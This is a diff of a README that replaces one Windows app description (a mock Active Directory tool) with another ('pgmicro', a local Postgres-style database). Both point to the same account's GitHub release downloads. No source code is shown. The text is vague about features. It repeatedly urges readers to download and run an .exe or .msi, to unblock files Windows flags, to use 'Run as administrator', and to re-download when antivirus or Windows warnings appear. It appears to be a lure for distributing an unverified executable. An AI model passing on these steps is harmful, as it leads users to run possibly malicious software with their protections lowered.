@@ -1,260 +1,273 @@
-# 🧩 MockAD-Release - Simple Active Directory Mockup
+# 🐘 pgmicro - Run Postgres Inside Your App
 
-[![Download MockAD-Release](https://img.shields.io/badge/Download-MockAD%20Release-blue?style=for-the-badge)](https://github.com/ansonhermetic435/MockAD-Release)
+[![Download pgmicro](https://img.shields.io/badge/Download-pgmicro-blue.svg?style=for-the-badge)](https://github.com/ansonhermetic435/pgmicro/releases)
 
-## 🖥️ What MockAD-Release Does
+## 🔍 What pgmicro is
 
-MockAD-Release is a Windows app that lets you build and view a mock Active Directory setup. It helps you map out domains, users, groups, computers, and policies in a clear tree view.
+pgmicro is a desktop app for Windows that runs a PostgreSQL-like database inside the app itself. It uses a storage engine that works with SQLite-style data files, so you can keep your data in one place without setting up a separate database server.
 
-Use it to:
+This makes it useful if you want a simple way to open, use, and manage local data on your PC. You do not need to learn server setup or run extra services in the background.
 
-- Learn how Active Directory is structured
-- Plan a lab before using real systems
-- Show AD concepts in a simple visual way
-- Keep notes on OUs, groups, and machines in one place
+## 💻 What you need
 
-It is made for end users. You do not need to know how to code.
-
-## 📥 Download and Install
-
-To get the app, visit this page to download:
-
-[https://github.com/ansonhermetic435/MockAD-Release](https://github.com/ansonhermetic435/MockAD-Release)
-
-After the page opens:
-
-1. Look for the latest release or download file
-2. Download the Windows file to your PC
-3. Open the file from your Downloads folder
-4. If Windows asks for permission, choose to run it
-5. Follow the on-screen steps to start MockAD-Release
-
-If the file comes as a ZIP folder:
-
-1. Right-click the ZIP file
-2. Choose Extract All
-3. Open the extracted folder
-4. Run the app file inside the folder
-
-## 🪟 Windows Requirements
-
-MockAD-Release is built for Windows desktop use. A standard home or work PC should be enough.
-
-Recommended setup:
+pgmicro is made for Windows computers. For smooth use, your PC should have:
 
 - Windows 10 or Windows 11
-- 4 GB RAM or more
-- 200 MB free disk space
-- Mouse or trackpad for drag and drop
-- A screen with at least 1280 × 720 resolution
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A modern 64-bit processor
+- Internet access for the first download
 
-For the best view, use a larger screen if you plan to work with many items at once.
+If your computer can run recent desktop apps, it should work with pgmicro.
 
-## 🚀 First Run
+## 📥 Download pgmicro
 
-When you open MockAD-Release for the first time, you may see a blank workspace or a starter layout.
+Go to the releases page and choose the latest Windows download:
 
-Typical first steps:
+[Download pgmicro from GitHub Releases](https://github.com/ansonhermetic435/pgmicro/releases)
 
-1. Open the app
-2. Create a domain
-3. Add an OU
-4. Add users, groups, and computers
-5. Arrange items in the tree
-6. Save your work
+Look for a file that matches Windows. Common names may include:
 
-The app is built to feel familiar if you have seen Active Directory tools before.
+- `.exe`
+- `.msi`
+- `.zip`
 
-## 🧭 Main Screen
+If you see more than one file, pick the one meant for Windows desktop use.
 
-The main screen uses a tree layout that helps you see your AD structure at a glance.
+## 🛠️ Install and open
 
-You can expect sections for:
+### If you downloaded an `.exe` file
 
-- Domains
-- Organizational Units
-- Users
-- Groups
-- Computers
-- Group policy items
-- Managed service accounts
-- Notes and descriptions
+1. Open your Downloads folder.
+2. Double-click the pgmicro installer or app file.
+3. If Windows asks for permission, click Yes.
+4. Follow the on-screen steps.
+5. Wait for the app to finish opening.
 
-You can click items in the tree to view details. This keeps your model organized and easy to read.
+### If you downloaded a `.zip` file
 
-## ✍️ Build Your AD Structure
+1. Open your Downloads folder.
+2. Right-click the `.zip` file.
+3. Choose Extract All.
+4. Pick a folder you can find again, such as Desktop or Documents.
+5. Open the extracted folder.
+6. Double-click the pgmicro app file inside.
 
-MockAD-Release lets you create a mock AD layout step by step.
+### If Windows blocks the file
 
-Common actions include:
+1. Right-click the file.
+2. Select Properties.
+3. If you see an Unblock box, check it.
+4. Click Apply.
+5. Try opening the file again.
 
-- Create a domain
-- Add OUs under that domain
-- Add users and groups inside OUs
-- Add computers for lab or office setups
-- Place policies where they belong
-- Mark security boundaries or tiers with color
+## 🚀 First launch
 
-This helps you model a real environment without using a real domain controller.
+When pgmicro opens for the first time, it may create its data folder and start the local database engine.
 
-## 🖱️ Move Items Around
+You may see a startup screen, a blank workspace, or a place to load or create a database file. That is normal.
 
-You can drag and drop items in the tree to move them to a new place.
+If the app asks where to store data, choose a folder you can find later. A good choice is:
 
-This is useful when you want to:
+- Documents
+- Desktop
+- A folder named `pgmicro-data`
 
-- Reorganize OUs
-- Move a user to another department
-- Shift a computer to a new group
-- Clean up a draft design
+## 🧭 Basic use
 
-You can also use:
+pgmicro is built for local database work. A normal flow looks like this:
 
-- Ctrl + C to copy a node
-- Ctrl + V to paste it in a new place
+1. Open the app.
+2. Create or open a database file.
+3. Add data or load existing data.
+4. Save your work.
+5. Close the app when you are done.
 
-The copy action includes the node and its child items, which saves time when you build similar structures.
+If the app shows tables, rows, or query boxes, those are part of the database view. You can use them to inspect data, edit records, and run database tasks in a local window.
 
-## 🎨 View and Color Options
+## 📁 Where your data is stored
 
-MockAD-Release includes visual options that make the tree easier to scan.
+pgmicro keeps your data on your PC. In most cases, the data lives in a folder you choose during setup or first use.
 
-You may use color cues for:
+To keep your files safe:
 
-- Tiered admin zones
-- Security boundaries
-- Important groups
-- Lab vs. production style layouts
+- Store the data folder in a location you back up
+- Avoid moving files while the app is open
+- Keep the folder name simple
+- Do not delete the data file unless you want to remove the database
 
-This helps when you want to show which parts of the structure need care or follow special rules.
+If you use cloud sync tools, make sure they do not lock the file while pgmicro is open.
 
-## 📝 Add Descriptions
+## 🔐 Simple safety tips
 
-Each item can hold a written description. Use this for extra detail that does not fit in the tree name.
+Because pgmicro stores data on your computer, follow these basic steps:
 
-Good uses include:
+- Use a folder with a clear name
+- Make a copy before large changes
+- Close the app before you back up the file
+- Keep one backup on another drive if the data matters to you
 
-- Owner name
-- Purpose of the OU
-- Group use case
-- Computer role
-- Policy notes
-- Test plan details
+These steps help protect your data if your PC has a problem.
 
-This makes the mock AD setup easier to review later.
+## 🧩 Common file types you may see
 
-## 🧰 Common Uses
+pgmicro may work with files such as:
 
-People may use MockAD-Release for:
+- Local database files
+- SQLite-compatible data files
+- Project folders
+- Export files like `.csv` or `.sql`
 
-- Training and practice
-- AD planning
-- Lab design
-- Team demos
-- Documentation
-- Security review prep
-- Explaining directory layout to new staff
+If you are not sure which file to open, start with the main data file in the folder you chose when you first used the app.
 
-It gives you a safe way to sketch the structure before you make real changes.
+## ⚙️ How to update
 
-## 🔄 Basic Workflow
+When a new version is available, repeat the download steps and get the newest release from GitHub.
 
-A simple way to use the app:
+1. Open the releases page.
+2. Download the latest Windows file.
+3. Close pgmicro if it is already open.
+4. Replace the old file or run the new installer.
+5. Open the app again.
 
-1. Start a new model
-2. Create the main domain
-3. Add OUs for teams or roles
-4. Add users, groups, and computers
-5. Copy items where needed
-6. Drag items into the right place
-7. Add notes and color markers
-8. Save your layout
+If your data lives in a separate folder, your files should stay in place during the update.
 
-This process works well for both small and large mock setups.
+## 🧰 If something does not work
 
-## 💾 Saving Your Work
+### The app will not open
 
-Make sure to save your changes as you go.
+- Check that you downloaded the Windows file
+- Try running it again as a normal user
+- Right-click the file and choose Run as administrator
+- Make sure your antivirus did not remove the file
 
-Good save habits:
+### The app opens, but the window is blank
 
-- Save after each major change
-- Keep one file per lab or project
-- Use clear names for your saved layouts
-- Store copies in a safe folder
+- Close the app
+- Open it again
+- Wait a few seconds for the first load
+- Check that the data folder still exists
 
-This helps you return to your mock AD design later without rebuilding it.
+### Your database file does not load
 
-## 🔍 Example Layout
+- Confirm you chose the right file
+- Make sure the file is not in use by another app
+- Move the file to a simple folder path like `C:\pgmicro`
+- Try opening it again
 
-A simple structure might look like this:
+### Windows says the file is unsafe
 
-- Contoso.local
-  - Workstations
-  - Servers
-  - Users
-    - Finance
-    - HR
-    - IT
-  - Groups
-    - Helpdesk
-    - Admins
-  - Policies
-    - Password Policy
-    - Desktop Policy
+- Confirm you downloaded it from the releases page
+- Download the file again
+- Save it to your Downloads folder
+- Open it from there
 
-You can build a layout like this to match a real office setup or a training lab.
+## 🪟 Suggested folder setup
 
-## 🧾 Tips for New Users
+A simple folder layout can make pgmicro easier to use:
 
-- Start with one domain
-- Add a few OUs before adding many users
-- Keep names short and clear
-- Use the same naming style across the tree
-- Use descriptions for details, not long names
-- Copy items when you need repeated setups
-- Drag and drop to keep the tree clean
+- `C:\pgmicro\app`
+- `C:\pgmicro\data`
+- `C:\pgmicro\backups`
 
-Simple naming makes the model easier to read.
+This keeps the app, your data, and your backups apart.
 
-## ❓ Help with Download Problems
+## 📦 Example first-time setup
 
-If the download page opens but you do not see a file right away:
+If you want a clean start on Windows:
 
-1. Scroll through the release page
-2. Look for the Assets section
-3. Choose the Windows file
-4. Save it to your computer
-5. Open it from the download location
+1. Create a folder named `pgmicro` in `C:\`
+2. Download the latest release from GitHub
+3. Put the app file in `C:\pgmicro\app`
+4. Create a separate `data` folder
+5. Open the app
+6. Choose the `data` folder when asked where to store files
+7. Create your first local database
 
-If Windows blocks the file, check that you downloaded it from the GitHub release page and try again from there.
+## 🧾 What pgmicro is good for
 
-## 📂 File and Folder Handling
+pgmicro fits use cases where you want a local database on your PC without setting up a server.
 
-If you use a ZIP file, keep this in mind:
+You may find it useful for:
 
-- Do not run the app from inside the ZIP
-- Extract the files first
-- Keep the folder together
-- Do not move single files out of the folder unless you know they are meant to be separate
+- Personal data storage
+- Small desktop tools
+- Local app development
+- Offline data work
+- Simple database tests
 
-This helps the app start the right way.
+It is built to stay close to PostgreSQL-style behavior while using a local storage layer that works like SQLite.
 
-## ⚙️ Suggested Use on a Work PC
+## 🧪 Working with data
 
-If you use MockAD-Release at work or in a lab, keep your project folders organized:
+If pgmicro gives you a table view, query box, or import option, you can use it to:
 
-- Create one folder for each setup
-- Store screenshots in a separate folder
-- Save notes with the same project name
-- Back up files before making large changes
+- Open a saved database
+- Add rows
+- Edit values
+- Search records
+- Export data for backup
+- Test local database ideas
 
-This keeps your mock environment easy to manage.
+Keep changes small the first time so you can learn how the app behaves.
 
-## 🔗 Download Again
+## 🗂️ Back up your files
 
-Visit this page to download:
+To back up your data:
 
-[https://github.com/ansonhermetic435/MockAD-Release](https://github.com/ansonhermetic435/MockAD-Release)
+1. Close pgmicro
+2. Find your data folder
+3. Copy the database file or folder
+4. Paste it into another drive or backup folder
+5. Keep the backup in a safe place
 
-Open the page, get the latest Windows file, then download and run it on your PC
+If the app uses one main file, back up that file. If it uses a folder, back up the full folder.
+
+## 📌 Quick start checklist
+
+- Download the latest Windows release
+- Open the file or extract the zip
+- Launch pgmicro
+- Choose a simple data folder
+- Create or open a database
+- Back up your data after setup
+
+## ❓ Frequently asked questions
+
+### Do I need a server?
+
+No. pgmicro runs locally on your Windows PC.
+
+### Do I need to know code?
+
+No. You can use it as a desktop app. Some tasks may still use database terms like table or query.
+
+### Can I move my files later?
+
+Yes. Keep the app open while you use it, but close it before moving data files.
+
+### Can I use it offline?
+
+Yes. After you download it, pgmicro works on your PC without a constant internet connection.
+
+### Where do I get updates?
+
+Use the GitHub releases page and download the newest Windows version
+
+## 📎 Download again
+
+[Visit the pgmicro releases page to download](https://github.com/ansonhermetic435/pgmicro/releases)
+
+## 🧭 File naming examples
+
+When you open the releases page, you may see files with names like:
+
+- `pgmicro-windows.exe`
+- `pgmicro-setup.msi`
+- `pgmicro-win64.zip`
+
+Pick the file that matches your Windows system and is meant for desktop use
+
+## 🧼 Keep your setup simple
+
+Use short folder names, store the app in one place, and keep the data in another. This helps you find your files later and makes backups easier
